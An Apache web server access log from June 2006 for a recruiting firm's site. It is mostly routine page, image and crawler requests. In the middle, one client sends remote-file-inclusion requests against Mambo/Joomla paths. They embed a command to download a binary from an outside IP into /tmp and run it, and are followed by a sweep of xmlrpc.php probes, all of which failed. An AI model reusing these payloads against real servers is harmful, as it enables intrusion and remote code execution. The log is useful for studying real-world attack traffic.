65.214.44.188 - - [05/Jun/2006:06:21:26 -0400] "GET / HTTP/1.0" 200 16180 "-" "Mozilla/2.0 (compatible; Ask Jeeves/Teoma; +http://about.ask.com/en/docs/about/webmasters.shtml)"
209.98.147.27 - - [05/Jun/2006:09:43:42 -0400] "GET /pix/title_employers.gif HTTP/1.1" 200 1036 "http://www.menziessearch.com/013contact.html" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/312.8 (KHTML, like Gecko) Safari/312.5"
209.98.147.27 - - [05/Jun/2006:09:43:42 -0400] "GET /pix/inthissection.gif HTTP/1.1" 200 591 "http://www.menziessearch.com/013contact.html" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/312.8 (KHTML, like Gecko) Safari/312.5"
209.98.147.27 - - [05/Jun/2006:09:43:42 -0400] "GET /pix/sidebutton_01a.gif HTTP/1.1" 200 1255 "http://www.menziessearch.com/013contact.html" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/312.8 (KHTML, like Gecko) Safari/312.5"
209.98.147.27 - - [05/Jun/2006:09:43:43 -0400] "GET /pix/sidebutton_01b.gif HTTP/1.1" 200 496 "http://www.menziessearch.com/013contact.html" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/312.8 (KHTML, like Gecko) Safari/312.5"
209.98.147.27 - - [05/Jun/2006:09:43:43 -0400] "GET /pix/sidebutton_01c-over.gif HTTP/1.1" 200 743 "http://www.menziessearch.com/013contact.html" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/312.8 (KHTML, like Gecko) Safari/312.5"
209.98.147.27 - - [05/Jun/2006:09:43:43 -0400] "GET /pix/back1line.gif HTTP/1.1" 200 67 "http://www.menziessearch.com/013contact.html" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/312.8 (KHTML, like Gecko) Safari/312.5"
209.98.147.27 - - [05/Jun/2006:09:43:43 -0400] "GET /pix/button_home-over.gif HTTP/1.1" 200 200 "http://www.menziessearch.com/013contact.html" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/312.8 (KHTML, like Gecko) Safari/312.5"
209.98.147.27 - - [05/Jun/2006:09:43:43 -0400] "GET /pix/button_candidates-over.gif HTTP/1.1" 200 344 "http://www.menziessearch.com/013contact.html" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/312.8 (KHTML, like Gecko) Safari/312.5"
209.98.147.27 - - [05/Jun/2006:09:43:43 -0400] "GET /pix/button_about-over.gif HTTP/1.1" 200 223 "http://www.menziessearch.com/013contact.html" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/312.8 (KHTML, like Gecko) Safari/312.5"
209.98.147.27 - - [05/Jun/2006:09:43:44 -0400] "GET /pix/sidebutton_03a-over.gif HTTP/1.1" 200 436 "http://www.menziessearch.com/013contact.html" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/312.8 (KHTML, like Gecko) Safari/312.5"
209.98.147.27 - - [05/Jun/2006:09:43:44 -0400] "GET /pix/sidebutton_03b-over.gif HTTP/1.1" 200 490 "http://www.menziessearch.com/013contact.html" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/312.8 (KHTML, like Gecko) Safari/312.5"
209.98.147.27 - - [05/Jun/2006:09:43:44 -0400] "GET /pix/sidebutton_03c-over.gif HTTP/1.1" 200 442 "http://www.menziessearch.com/013contact.html" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/312.8 (KHTML, like Gecko) Safari/312.5"
209.98.147.27 - - [05/Jun/2006:09:43:45 -0400] "GET /favicon.ico HTTP/1.1" 404 1461 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/312.8 (KHTML, like Gecko) Safari/312.5"
209.98.147.27 - - [05/Jun/2006:09:44:00 -0400] "GET /pix/sidebutton_01a-over.gif HTTP/1.1" 200 1196 "http://www.menziessearch.com/013contact.html" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/312.8 (KHTML, like Gecko) Safari/312.5"
209.98.147.27 - - [05/Jun/2006:09:44:00 -0400] "GET /pix/sidebutton_01b-over.gif HTTP/1.1" 200 437 "http://www.menziessearch.com/013contact.html" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/312.8 (KHTML, like Gecko) Safari/312.5"
209.98.147.27 - - [05/Jun/2006:09:44:04 -0400] "GET /index.html HTTP/1.1" 200 16180 "http://www.menziessearch.com/013contact.html" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/312.8 (KHTML, like Gecko) Safari/312.5"
209.98.147.27 - - [05/Jun/2006:09:44:05 -0400] "GET /pix/photo_home.jpg HTTP/1.1" 200 6177 "http://www.menziessearch.com/index.html" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/312.8 (KHTML, like Gecko) Safari/312.5"
209.98.147.27 - - [05/Jun/2006:09:44:05 -0400] "GET /pix/button_employers.gif HTTP/1.1" 200 301 "http://www.menziessearch.com/index.html" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/312.8 (KHTML, like Gecko) Safari/312.5"
209.98.147.27 - - [05/Jun/2006:09:44:05 -0400] "GET /pix/back_home.gif HTTP/1.1" 200 5333 "http://www.menziessearch.com/index.html" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/312.8 (KHTML, like Gecko) Safari/312.5"
209.98.147.27 - - [05/Jun/2006:09:44:05 -0400] "GET /pix/hjhl.gif HTTP/1.1" 200 534 "http://www.menziessearch.com/index.html" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/312.8 (KHTML, like Gecko) Safari/312.5"
209.98.147.27 - - [05/Jun/2006:09:44:05 -0400] "GET /pix/afaik.gif HTTP/1.1" 200 567 "http://www.menziessearch.com/index.html" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/312.8 (KHTML, like Gecko) Safari/312.5"
209.98.147.27 - - [05/Jun/2006:09:44:05 -0400] "GET /pix/fwiw.gif HTTP/1.1" 200 531 "http://www.menziessearch.com/index.html" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/312.8 (KHTML, like Gecko) Safari/312.5"
209.98.147.27 - - [05/Jun/2006:09:44:05 -0400] "GET /pix/ttys.gif HTTP/1.1" 200 484 "http://www.menziessearch.com/index.html" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/312.8 (KHTML, like Gecko) Safari/312.5"
66.249.72.179 - - [05/Jun/2006:11:25:34 -0400] "GET /robots.txt HTTP/1.1" 404 1461 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.72.179 - - [05/Jun/2006:11:25:34 -0400] "GET /02candidates.html HTTP/1.1" 200 16658 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.194.6.70 - - [05/Jun/2006:14:58:23 -0400] "GET / HTTP/1.1" 200 16180 "-" "Mozilla/5.0 (compatible; Konqueror/3.1-rc5; i686 Linux; 20020615)"
209.176.198.34 - - [05/Jun/2006:14:59:01 -0400] "GET /03about/031meetdonna.html HTTP/1.1" 200 16250 "http://www.google.com/search?hl=en&q=donna+menzies&btnG=Google+Search" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/418 (KHTML, like Gecko) Safari/417.9.2"
209.176.198.34 - - [05/Jun/2006:14:59:02 -0400] "GET /pix/espacio.gif HTTP/1.1" 200 43 "http://www.menziessearch.com/03about/031meetdonna.html" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/418 (KHTML, like Gecko) Safari/417.9.2"
209.176.198.34 - - [05/Jun/2006:14:59:02 -0400] "GET /menzies.css HTTP/1.1" 200 1397 "http://www.menziessearch.com/03about/031meetdonna.html" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/418 (KHTML, like Gecko) Safari/417.9.2"
209.176.198.34 - - [05/Jun/2006:14:59:02 -0400] "GET /pix/photo_about.jpg HTTP/1.1" 200 5707 "http://www.menziessearch.com/03about/031meetdonna.html" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/418 (KHTML, like Gecko) Safari/417.9.2"
209.176.198.34 - - [05/Jun/2006:14:59:02 -0400] "GET /pix/logo.gif HTTP/1.1" 200 1499 "http://www.menziessearch.com/03about/031meetdonna.html" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/418 (KHTML, like Gecko) Safari/417.9.2"
209.176.198.34 - - [05/Jun/2006:14:59:02 -0400] "GET /pix/redpixel.gif HTTP/1.1" 200 35 "http://www.menziessearch.com/03about/031meetdonna.html" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/418 (KHTML, like Gecko) Safari/417.9.2"
209.176.198.34 - - [05/Jun/2006:14:59:02 -0400] "GET /pix/slogan.gif HTTP/1.1" 200 1226 "http://www.menziessearch.com/03about/031meetdonna.html" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/418 (KHTML, like Gecko) Safari/417.9.2"
209.176.198.34 - - [05/Jun/2006:14:59:02 -0400] "GET /pix/button_home.gif HTTP/1.1" 200 200 "http://www.menziessearch.com/03about/031meetdonna.html" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/418 (KHTML, like Gecko) Safari/417.9.2"
209.176.198.34 - - [05/Jun/2006:14:59:02 -0400] "GET /pix/button_employers.gif HTTP/1.1" 200 301 "http://www.menziessearch.com/03about/031meetdonna.html" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/418 (KHTML, like Gecko) Safari/417.9.2"
209.176.198.34 - - [05/Jun/2006:14:59:02 -0400] "GET /pix/button_candidates.gif HTTP/1.1" 200 344 "http://www.menziessearch.com/03about/031meetdonna.html" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/418 (KHTML, like Gecko) Safari/417.9.2"
209.176.198.34 - - [05/Jun/2006:14:59:03 -0400] "GET /pix/button_about-over.gif HTTP/1.1" 200 223 "http://www.menziessearch.com/03about/031meetdonna.html" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/418 (KHTML, like Gecko) Safari/417.9.2"
209.176.198.34 - - [05/Jun/2006:14:59:03 -0400] "GET /pix/graypixel.gif HTTP/1.1" 200 35 "http://www.menziessearch.com/03about/031meetdonna.html" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/418 (KHTML, like Gecko) Safari/417.9.2"
209.176.198.34 - - [05/Jun/2006:14:59:03 -0400] "GET /pix/title_about.gif HTTP/1.1" 200 1784 "http://www.menziessearch.com/03about/031meetdonna.html" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/418 (KHTML, like Gecko) Safari/417.9.2"
209.176.198.34 - - [05/Jun/2006:14:59:03 -0400] "GET /pix/back1line.gif HTTP/1.1" 200 67 "http://www.menziessearch.com/03about/031meetdonna.html" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/418 (KHTML, like Gecko) Safari/417.9.2"
209.176.198.34 - - [05/Jun/2006:14:59:03 -0400] "GET /pix/inthissection.gif HTTP/1.1" 200 591 "http://www.menziessearch.com/03about/031meetdonna.html" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/418 (KHTML, like Gecko) Safari/417.9.2"
209.176.198.34 - - [05/Jun/2006:14:59:03 -0400] "GET /pix/sidebutton_03a-over.gif HTTP/1.1" 200 436 "http://www.menziessearch.com/03about/031meetdonna.html" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/418 (KHTML, like Gecko) Safari/417.9.2"
209.176.198.34 - - [05/Jun/2006:14:59:03 -0400] "GET /pix/sidebutton_03b.gif HTTP/1.1" 200 546 "http://www.menziessearch.com/03about/031meetdonna.html" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/418 (KHTML, like Gecko) Safari/417.9.2"
209.176.198.34 - - [05/Jun/2006:14:59:03 -0400] "GET /favicon.ico HTTP/1.1" 404 1461 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/418 (KHTML, like Gecko) Safari/417.9.2"
209.176.198.34 - - [05/Jun/2006:14:59:03 -0400] "GET /pix/sidebutton_03c.gif HTTP/1.1" 200 506 "http://www.menziessearch.com/03about/031meetdonna.html" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/418 (KHTML, like Gecko) Safari/417.9.2"
209.176.198.34 - - [05/Jun/2006:14:59:04 -0400] "GET /pix/button_candidates-over.gif HTTP/1.1" 200 344 "http://www.menziessearch.com/03about/031meetdonna.html" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/418 (KHTML, like Gecko) Safari/417.9.2"
209.176.198.34 - - [05/Jun/2006:14:59:04 -0400] "GET /pix/button_employers-over.gif HTTP/1.1" 200 301 "http://www.menziessearch.com/03about/031meetdonna.html" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/418 (KHTML, like Gecko) Safari/417.9.2"
209.176.198.34 - - [05/Jun/2006:14:59:04 -0400] "GET /pix/sidebutton_03b-over.gif HTTP/1.1" 200 490 "http://www.menziessearch.com/03about/031meetdonna.html" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/418 (KHTML, like Gecko) Safari/417.9.2"
209.176.198.34 - - [05/Jun/2006:14:59:05 -0400] "GET /pix/button_home-over.gif HTTP/1.1" 200 200 "http://www.menziessearch.com/03about/031meetdonna.html" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/418 (KHTML, like Gecko) Safari/417.9.2"
209.176.198.34 - - [05/Jun/2006:14:59:05 -0400] "GET /pix/sidebutton_03c-over.gif HTTP/1.1" 200 442 "http://www.menziessearch.com/03about/031meetdonna.html" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/418 (KHTML, like Gecko) Safari/417.9.2"
209.176.198.34 - - [05/Jun/2006:14:59:27 -0400] "GET /index.html HTTP/1.1" 200 16180 "http://www.menziessearch.com/03about/031meetdonna.html" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/418 (KHTML, like Gecko) Safari/417.9.2"
209.176.198.34 - - [05/Jun/2006:14:59:27 -0400] "GET /pix/photo_home.jpg HTTP/1.1" 200 6177 "http://www.menziessearch.com/index.html" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/418 (KHTML, like Gecko) Safari/417.9.2"
209.176.198.34 - - [05/Jun/2006:14:59:28 -0400] "GET /pix/button_about.gif HTTP/1.1" 200 223 "http://www.menziessearch.com/index.html" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/418 (KHTML, like Gecko) Safari/417.9.2"
209.176.198.34 - - [05/Jun/2006:14:59:28 -0400] "GET /pix/back_home.gif HTTP/1.1" 200 5333 "http://www.menziessearch.com/index.html" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/418 (KHTML, like Gecko) Safari/417.9.2"
209.176.198.34 - - [05/Jun/2006:14:59:28 -0400] "GET /pix/hjhl.gif HTTP/1.1" 200 534 "http://www.menziessearch.com/index.html" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/418 (KHTML, like Gecko) Safari/417.9.2"
209.176.198.34 - - [05/Jun/2006:14:59:28 -0400] "GET /pix/afaik.gif HTTP/1.1" 200 567 "http://www.menziessearch.com/index.html" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/418 (KHTML, like Gecko) Safari/417.9.2"
209.176.198.34 - - [05/Jun/2006:14:59:28 -0400] "GET /pix/fwiw.gif HTTP/1.1" 200 531 "http://www.menziessearch.com/index.html" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/418 (KHTML, like Gecko) Safari/417.9.2"
209.176.198.34 - - [05/Jun/2006:14:59:28 -0400] "GET /pix/ttys.gif HTTP/1.1" 200 484 "http://www.menziessearch.com/index.html" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/418 (KHTML, like Gecko) Safari/417.9.2"
64.84.32.91 - - [05/Jun/2006:15:11:40 -0400] "GET /index2.php?option=com_content&do_pdf=1&id=1index2.php?_REQUEST[option]=com_content&_REQUEST[Itemid]=1&GLOBALS=&mosConfig_absolute_path=http://72.18.195.161/cmd.gif?&cmd=cd%20/tmp;wget%2072.18.195.161/lnikon;chmod%20744%20lnikon;./lnikon;echo%20YYY;echo|  HTTP/1.1" 404 1461 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)"
64.84.32.91 - - [05/Jun/2006:15:11:41 -0400] "GET /index.php?option=com_content&do_pdf=1&id=1index2.php?_REQUEST[option]=com_content&_REQUEST[Itemid]=1&GLOBALS=&mosConfig_absolute_path=http://72.18.195.161/cmd.gif?&cmd=cd%20/tmp;wget%2072.18.195.161/lnikon;chmod%20744%20lnikon;./lnikon;echo%20YYY;echo|  HTTP/1.1" 404 1461 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)"
64.84.32.91 - - [05/Jun/2006:15:11:42 -0400] "GET /mambo/index2.php?_REQUEST[option]=com_content&_REQUEST[Itemid]=1&GLOBALS=&mosConfig_absolute_path=http://72.18.195.161/cmd.gif?&cmd=cd%20/tmp;wget%2072.18.195.161/lnikon;chmod%20744%20lnikon;./lnikon;echo%20YYY;echo|  HTTP/1.1" 404 1461 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)"
64.84.32.91 - - [05/Jun/2006:15:11:43 -0400] "GET /cvs/index2.php?_REQUEST[option]=com_content&_REQUEST[Itemid]=1&GLOBALS=&mosConfig_absolute_path=http://72.18.195.161/cmd.gif?&cmd=cd%20/tmp;wget%2072.18.195.161/lnikon;chmod%20744%20lnikon;./lnikon;echo%20YYY;echo|  HTTP/1.1" 404 1461 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)"
64.84.32.91 - - [05/Jun/2006:15:11:44 -0400] "GET /articles/mambo/index2.php?_REQUEST[option]=com_content&_REQUEST[Itemid]=1&GLOBALS=&mosConfig_absolute_path=http://72.18.195.161/cmd.gif?&cmd=cd%20/tmp;wget%2072.18.195.161/lnikon;chmod%20744%20lnikon;./lnikon;echo%20YYY;echo|  HTTP/1.1" 404 1461 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)"
64.84.32.91 - - [05/Jun/2006:15:11:45 -0400] "GET /cvs/mambo/index2.php?_REQUEST[option]=com_content&_REQUEST[Itemid]=1&GLOBALS=&mosConfig_absolute_path=http://72.18.195.161/cmd.gif?&cmd=cd%20/tmp;wget%2072.18.195.161/lnikon;chmod%20744%20lnikon;./lnikon;echo%20YYY;echo|  HTTP/1.1" 404 1461 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)"
64.84.32.91 - - [05/Jun/2006:15:11:46 -0400] "POST /xmlrpc.php HTTP/1.1" 404 1461 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)"
64.84.32.91 - - [05/Jun/2006:15:11:47 -0400] "POST /blog/xmlrpc.php HTTP/1.1" 400 - "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)"
64.84.32.91 - - [05/Jun/2006:15:11:49 -0400] "POST /blog/xmlsrv/xmlrpc.php HTTP/1.1" 400 - "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)"
64.84.32.91 - - [05/Jun/2006:15:11:50 -0400] "POST /blogs/xmlsrv/xmlrpc.php HTTP/1.1" 400 - "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)"
64.84.32.91 - - [05/Jun/2006:15:11:51 -0400] "POST /drupal/xmlrpc.php HTTP/1.1" 400 - "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)"
64.84.32.91 - - [05/Jun/2006:15:11:52 -0400] "POST /phpgroupware/xmlrpc.php HTTP/1.1" 400 - "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)"
64.84.32.91 - - [05/Jun/2006:15:11:53 -0400] "POST /wordpress/xmlrpc.php HTTP/1.1" 400 - "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)"
64.84.32.91 - - [05/Jun/2006:15:11:54 -0400] "POST /xmlrpc.php HTTP/1.1" 404 1461 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)"
64.84.32.91 - - [05/Jun/2006:15:11:55 -0400] "POST /xmlrpc/xmlrpc.php HTTP/1.1" 400 - "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)"
64.84.32.91 - - [05/Jun/2006:15:11:56 -0400] "POST /xmlsrv/xmlrpc.php HTTP/1.1" 400 - "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)"
68.93.211.5 - - [05/Jun/2006:16:08:51 -0400] "GET / HTTP/1.1" 200 16180 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/416.11 (KHTML, like Gecko) Safari/416.12"
68.93.211.5 - - [05/Jun/2006:16:08:51 -0400] "GET /pix/espacio.gif HTTP/1.1" 200 43 "http://www.menziessearch.com/" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/416.11 (KHTML, like Gecko) Safari/416.12"
68.93.211.5 - - [05/Jun/2006:16:08:51 -0400] "GET /pix/redpixel.gif HTTP/1.1" 200 35 "http://www.menziessearch.com/" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/416.11 (KHTML, like Gecko) Safari/416.12"
68.93.211.5 - - [05/Jun/2006:16:08:51 -0400] "GET /pix/logo.gif HTTP/1.1" 200 1499 "http://www.menziessearch.com/" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/416.11 (KHTML, like Gecko) Safari/416.12"
68.93.211.5 - - [05/Jun/2006:16:08:51 -0400] "GET /pix/slogan.gif HTTP/1.1" 200 1226 "http://www.menziessearch.com/" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/416.11 (KHTML, like Gecko) Safari/416.12"
68.93.211.5 - - [05/Jun/2006:16:08:51 -0400] "GET /pix/button_employers.gif HTTP/1.1" 200 301 "http://www.menziessearch.com/" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/416.11 (KHTML, like Gecko) Safari/416.12"
68.93.211.5 - - [05/Jun/2006:16:08:52 -0400] "GET /pix/button_candidates.gif HTTP/1.1" 200 344 "http://www.menziessearch.com/" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/416.11 (KHTML, like Gecko) Safari/416.12"
68.93.211.5 - - [05/Jun/2006:16:08:52 -0400] "GET /pix/hjhl.gif HTTP/1.1" 200 534 "http://www.menziessearch.com/" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/416.11 (KHTML, like Gecko) Safari/416.12"
68.93.211.5 - - [05/Jun/2006:16:08:52 -0400] "GET /pix/afaik.gif HTTP/1.1" 200 567 "http://www.menziessearch.com/" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/416.11 (KHTML, like Gecko) Safari/416.12"
68.93.211.5 - - [05/Jun/2006:16:08:52 -0400] "GET /pix/fwiw.gif HTTP/1.1" 200 531 "http://www.menziessearch.com/" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/416.11 (KHTML, like Gecko) Safari/416.12"
